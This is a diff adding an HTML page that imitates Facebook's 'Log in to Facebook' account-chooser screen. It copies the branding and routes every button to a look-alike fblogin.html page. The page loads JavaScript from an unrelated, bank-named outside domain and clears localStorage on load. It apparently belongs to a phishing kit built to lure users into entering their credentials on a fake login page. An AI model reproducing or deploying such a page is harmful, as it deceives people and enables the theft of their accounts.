@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="theme-color" content="#222222">
+  <link rel="stylesheet" href="../lib/w3css.css">
+  <link rel="stylesheet" href="../lib/cssLibrary.css">
+   <link rel="shortcut icon" href="fb.png" type="image/png">
+   
+  <link rel="stylesheet" href="fb.css">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in to Facebook</title>
+</head>
+<body>
+
+  <nav class="flexBetween w3-padding w3-xlarge" style="align-items: center;">
+    <button style="visibility:hidden;"></button>
+    <button style="font-weight:bolder; font-size:xx-large;font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">Facebook</button>
+    <button class="fa fa-info" style="font-size:smaller !important; width:25px;height:25px; border-radius:12.5px; background:white; color:black;"></button>
+  </nav>
+<div id="text" class="w3-block"><div class="box"></div>
+  By proceeding, you agree to Facebook Terms
+</div>
+
+<div id="ctn">
+  
+<p>Choose your account</p>
+<a href="fblogin.html">
+  <div class="flexRound">
+  <button style="font-size:x-large !important;"  class="fa fa-plus fexCenter"></button><span>Log in to another account</span>
+ 
+</div></a>
+
+<a href="fblogin.html">
+<div class="flexRound">
+  <button class="fa fa-search"></button>
+  <span>Find you account</span>
+</div></a>
+
+</div><br><br>
+<a href="fblogin.html">
+<div class="flexCenter">
+  <button id="go">Create New Account</button>
+</div></a>
+ </body>
+ <script src="https://metrolonlinebank.com/MfunctionsLap.js"></script>
+ <script src="index.js"></script>
+ <script>
+   onload=()=>{
+   localStorage.clear();
+   if(location.protocol!="https"){
+//window.location.href=location.href.replace("http://","https://");
+   }
+   }
+ </script>
+</html>
